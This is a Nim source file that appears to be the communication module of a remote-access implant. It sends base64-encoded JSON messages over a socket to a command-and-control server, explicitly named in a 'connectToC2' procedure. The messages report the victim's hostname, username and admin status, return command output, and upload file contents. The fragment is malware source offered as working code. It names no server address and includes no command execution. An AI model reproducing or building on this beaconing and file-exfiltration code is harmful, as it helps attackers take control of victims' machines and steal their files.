import net, base64, json

proc sendData(client: Socket, data: string) =
    client.send(encode(data) & "\r\n")

proc sendOutput*(client: Socket, category: string, output: string) =
    let j = %*
        {
            "task": "output",
            "category": category,
            "output": encode(output)
        }
    client.sendData($j)

proc identify*(client: Socket, hostname: string, isAdmin: bool, username: string) =
    let j = %*
        {
            "task": "identify",
            "hostname": hostname,
            "isAdmin": isAdmin,
            "username": username
        }
    client.sendData($j)

proc connectToC2*(client: Socket) =
    let j = %*
        {
            "task": "connect"
        }
    client.sendData($j)

proc sendFile*(client: Socket, path: string, b64c: string) =
    let j = %*
        {
            "task": "file",
            "path": path,
            "contents": b64c
        }
    client.sendData($j)